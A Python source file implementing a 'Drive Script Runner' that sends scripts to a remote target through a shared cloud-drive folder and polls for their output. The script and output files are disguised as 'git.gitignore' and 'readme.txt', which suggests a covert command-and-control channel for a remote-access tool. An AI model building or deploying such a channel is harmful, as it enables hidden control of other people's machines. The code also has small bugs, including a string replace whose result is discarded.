"""
Drive Script Runner
"""


from enum import Enum
from abc import ABC, abstractmethod
from drive.drive_client import DriveClient
from drive.drive_watcher import DriveListener
from logger.logger import Logger


class DSState(Enum):
    Initial = 1
    Sending = 2
    Sent = 3
    Running = 4
    GettingOutput = 5
    Finished = 6


class DSStateListener(ABC):
    @abstractmethod
    def changed(self, state):
        pass


# Drive change listener
class DSListener(DriveListener):
    def __init__(self, master):
        self._master = master

    def changed(self):
        self._master._drive_changed()


class DSRunner:
    _ScriptFileName = "git.gitignore"
    _ScriptOutputFileName = "readme.txt"

    def __init__(self):
        self._drive_client = None
        self._path_prefix = None
        self._drive_listener = DSListener(self)
        self._script_state = DSState.Initial
        self._script_state_listener = None
        self._script_output = ""

    def get_path_prefix(self):
        return self._path_prefix

    def init(self, drive_client: DriveClient, path_prefix: str,
             state_listener: DSListener = None):
        self._drive_client = drive_client
        self._path_prefix = path_prefix
        self._drive_listener = DSListener(self)
        self._script_state = DSState.Initial
        self._script_state_listener = state_listener
        self._script_output = ""

        # Listen drive changes
        self._drive_client.get_watcher().register(self._drive_listener)

    def cleanup(self):
        self.reset()
        self._drive_client.get_watcher().unregister(self._drive_listener)
        self._drive_client = None
        self._path_prefix = ""
        self._script_state_listener = None

    def reset(self):
        self._script_state = DSState.Initial
        self._drive_client.remove(self._get_script_file_path())
        self._drive_client.remove(self._get_script_output_file_path())
        self._script_output = ""

    def run_script(self, script: str):
        if self._script_state == DSState.Initial or self._script_state == DSState.Finished:
            if self._script_state == DSState.Finished:
                self._change_state(DSState.Initial)
            # Send script to target
            script = self._replace_script_tags(script)
            self._change_state(DSState.Sending)
            self._drive_client.upload_file_content(script, "windows-1251", self._get_script_file_path())

    def get_script_state(self):
        return self._script_state

    def get_script_output(self):
        # Get dir contents
        file_list = self._drive_client.list_dir(self._path_prefix)
        if self._ScriptOutputFileName in file_list:
            # Take output from drive
            output_file_path = self._get_script_output_file_path()
            self._script_output = self._drive_client.download_file_content(output_file_path)
            self._drive_client.remove(output_file_path)
        return self._script_output

    def output_taken(self):
        if self._script_state == DSState.GettingOutput:
            self._change_state(DSState.Finished)

    def _drive_changed(self):
        try:
            # Get dir contents
            file_list = self._drive_client.list_dir(self._path_prefix)
            exists_script_file = self._ScriptFileName in file_list
            exists_script_output_file = self._ScriptOutputFileName in file_list
            # Resolve state
            if self._script_state == DSState.Sending:
                if exists_script_file:
                    self._change_state(DSState.Sent)
            elif self._script_state == DSState.Sent:
                if not exists_script_file:
                    self._change_state(DSState.Running)
            elif self._script_state == DSState.Running:
                if exists_script_output_file:
                    self._change_state(DSState.GettingOutput)
        except Exception as ex:
            raise ex
            print(f"Exception file({__name__}): {str(ex)}")

    def _change_state(self, state):
        self._script_state = state
        if self._script_state_listener:
            print("Command: ", state.name)
            self._script_state_listener.changed(state)

    def _get_script_file_path(self):
        return self._path_prefix + "/" + self._ScriptFileName

    def _get_script_output_file_path(self):
        return self._path_prefix + "/" + self._ScriptOutputFileName

    def _replace_script_tags(self, script):
        script.replace("<path_prefix>", self._path_prefix)
        return script
